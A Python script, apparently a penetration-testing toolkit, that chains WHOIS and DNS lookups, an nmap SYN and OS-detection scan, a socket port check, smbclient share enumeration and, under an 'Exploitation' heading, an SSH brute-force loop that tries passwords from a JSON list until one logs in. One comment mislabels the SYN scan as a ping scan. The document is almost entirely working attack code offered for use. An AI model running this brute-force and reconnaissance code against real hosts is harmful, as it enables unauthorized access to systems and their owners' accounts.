import whois
import requests
import nmap
import socket
import subprocess
import paramiko
import json

# Load Configuration from JSON
def load_config(file_path='config.json'):
    with open(file_path, 'r') as f:
        config = json.load(f)
    return config

# Passive Recon - WHOIS and DNS Lookup
def passive_recon(domain):
    try:
        domain_info = whois.whois(domain)
        return domain_info
    except Exception as e:
        return f"Error fetching WHOIS info: {str(e)}"

def dns_lookup(domain):
    try:
        response = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}")
        return response.text
    except Exception as e:
        return f"Error performing DNS lookup: {str(e)}"

# Active Recon - Port Scanning with Nmap
def active_recon(target):
    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=target, arguments='-sS -O')  # Simple ping scan to check if the host is up
        if target in nm.all_hosts():
            # Extract details from the scan
            result = {
                'host': target,
                'state': nm[target].state(),
                'protocols': []
            }
            
            # Iterate through all protocols (tcp, udp) and collect open ports
            for proto in nm[target].all_protocols():
                ports = nm[target][proto].keys()
                for port in ports:
                    port_info = nm[target][proto][port]
                    result['protocols'].append({
                        'protocol': proto,
                        'port': port,
                        'state': port_info['state'],
                        'name': port_info.get('name', 'unknown'),
                        'product': port_info.get('product', 'N/A'),
                        'version': port_info.get('version', 'N/A')
                    })
            return result
        else:
            return f"Error: Host {target} not found or is not up"
    except nmap.PortScannerError as e:
        return f"Nmap error: {str(e)}"
    except Exception as e:
        return f"Unexpected error: {str(e)}"

# Vulnerability Assessment - Check Open Ports
def check_open_ports(target, ports):
    open_ports = []
    try:
        ports = [int(port) for port in ports]  # Convert strings to integers
    except ValueError as e:
        return f"Invalid port number. All ports should be integers. Error: {str(e)}"
    
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except Exception as e:
            return f"Error checking port {port} on {target}: {str(e)}"
    
    return open_ports if open_ports else f"No open ports found on {target}"

# Enumeration - SMB Enumeration
def smb_enumeration(target):
    try:
        result = subprocess.run(['smbclient', '-L', target], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout
    except Exception as e:
        return f"Error performing SMB enumeration: {str(e)}"

# Exploitation - SSH Bruteforce
def load_passwords(file_path='passwords.json'):
    with open(file_path, 'r') as f:
        data = json.load(f)
    return data['passwords']

def ssh_bruteforce(target, user, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for password in password_list:
        try:
            ssh.connect(target, username=user, password=password)
            return f"Success with password: {password}"
        except paramiko.AuthenticationException:
            continue
        except Exception as e:
            return f"Error connecting: {str(e)}"
    return "No valid password found"

# Save Scan Results to JSON
def save_scan_results(results, file_path='scan_results.json'):
    with open(file_path, 'w') as f:
        json.dump(results, f, indent=4)

def example_dynamic_scan():
    config = load_config()
    target = config['target']
    ports = config['ports']
    
    open_ports = check_open_ports(target, ports)
    save_scan_results(open_ports, 'open_ports.json')
